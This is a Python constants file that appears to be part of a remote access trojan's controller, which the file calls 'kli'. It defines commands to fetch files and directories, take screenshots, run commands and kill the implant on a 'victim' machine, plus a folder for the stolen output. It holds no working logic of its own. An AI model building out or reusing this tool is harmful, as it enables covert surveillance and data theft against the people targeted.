
class ConnectionConstants(object):
    TCP_PORT = 55554
    CONNECTION_FAILED_MSG = "Connection attempt to victim '{}' failed.. "
    SOCKET_TIMEOUT_LENGTH = 2
    CONNECTION_SUCCESS_MSG = "Connected to kli on ip: {}"
    KLI_NOT_RESPONDING_WARNING_MSG = "Kli not responding.. "

class SocketHandlerConstants(object):
    HANDLER_INITIATE_ERROR_MSG = "SocketHandler argument requirements not satisfied"
    CLIENT_KEY = "client"
    SERVER_KEY = "server"
    TCP_PORT_KEY = "tcp_port"
    HOSTNAME_KEY = "connect_to"
    SOCKET_TIMEOUT_KEY = "socket_timeout"

class DataTransmissionConstants(object):
    RECV_BUFFER_SIZE = 100
    MAX_SENT_DATA_SIZE = 2048
    ACK = "ACK"
    BASE64 = "base64"
    UNKNOWN_COMMAND_RESPONSE_ERROR_MSG = "Unknown command response received.. "

class CommandConstants(object):
    PRODUCTS_DIR = r"D:\tpy\project_roni\Products\stuff_[{hostname}@{ip}]"
    INVALID_COMMAND_RESPONSE_INDICATOR = "invalid"

    GETFILE_COMMAND_INDICATOR = "getfile"
    GETFILE_COMPLETE_MSG = "File '{}' got home safe and sound!"
    GETFILE_FILE_PATH_INVALID_MSG = "File path invalid: '{}'"

    GETDIR_COMMAND_INDICATOR = "getdir"
    GETDIR_DIR_PATH_INVALID_MSG = "Dir path invalid: '{}'"
    GETDIR_POSITIVE_CONFIRMATION = "y"
    GETDIR_NEGATIVE_CONFIRMATION = "n"
    GETDIR_CONFIRMATION_MSG = "Total size of files in dir is: {} Kb. Continue? " + \
                              "({0}\{1})  ".format(GETDIR_POSITIVE_CONFIRMATION, GETDIR_NEGATIVE_CONFIRMATION)


    SCREENSHOT_COMMAND_INDICATOR = "screenshot"
    SCREENSHOT_VALID_ARGS_COUNT = [0, 2]
    SCREENSHOT_INVALID_ARGS_ERROR_MSG = "Screenshot command arguments invalid..\nUsage: screenshot <<optional: <number of screenshots> <time between screenshots in ms> >>"
    SCREENSHOTS_DIR_NAME = "screenshots"
    SCREENSHOT_TEMP_PATH = "shot_{}.jpg"
    SCREENSHOT_COMPLETE_MSG = "Screenshot got home safe and sound!"

    RUN_COMMAND_INDICATOR = "run:"
    RUN_COMMAND_INVALID = "Command invalid: '{}'. failed to run.. "
    RUN_COMMAND_SUCCESSFUL_MSG = "command '{0}' ran successfully! process id: {1}\n"

    KILL_KLI_COMMAND_INDICATOR = "exit"
    KILLED_KLI_MSG = "Kli killed!"